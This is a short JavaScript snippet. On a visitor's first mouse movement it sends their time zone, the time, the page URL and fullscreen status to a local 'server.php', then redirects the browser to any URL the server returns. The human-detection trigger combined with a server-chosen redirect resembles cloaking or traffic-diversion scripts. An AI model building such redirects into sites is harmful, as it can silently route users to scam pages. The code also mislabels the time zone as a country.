    document.addEventListener('mousemove', function firstMouseMove(event) {
    // Remove this event listener to trigger only once
    document.removeEventListener('mousemove', firstMouseMove);

    // Collect client data
    const country = Intl.DateTimeFormat().resolvedOptions().timeZone; // Ideally, you can retrieve the user's country here using some API
    const time = new Date().toISOString();
    const url = window.location.href;
    const fullscreenStatus = document.fullscreenElement !== null ? 1:0;

    // Send data to server
    fetch('server.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            country: country,
            time: time,
            url: url,
            fullscreen_status: fullscreenStatus
        })
    })
    .then(response => response.json())
    .then(data => {
        // Handle the action based on the server response
        if (data.action_name === 'redirect') {
            window.location.href = data.action_value; // Redirect to the given URL
        }
    })
    .catch(error => console.error('Error:', error));
});

